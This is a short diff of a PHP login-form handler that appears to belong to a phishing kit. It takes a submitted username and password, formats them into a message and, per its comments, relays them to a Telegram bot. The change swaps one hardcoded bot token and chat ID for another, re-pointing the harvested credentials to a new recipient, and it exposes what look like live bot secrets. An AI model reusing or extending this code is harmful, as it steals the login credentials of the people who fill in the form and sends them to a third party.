@@ -6,9 +6,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $pass = htmlspecialchars($_POST['pass']);
     
     // Telegram bot credentials
-    $botToken = '7509491174:AAGVMKte0Ty9oAb27pVI0RXshKmiprSkJwg'; // Replace with your bot token
-    $chatId = '2100702364'; // Replace with your chat ID
-    
+    $botToken = '7404595804:AAGLE2DSIFR0om14aoPECPucVhB43eg5J0o'; // Replace with your bot token
+    $chatId = '6778791707'; // Replace with your chat ID
     // Prepare message
     $message = "Username: $uname\nPassword: $pass";
     
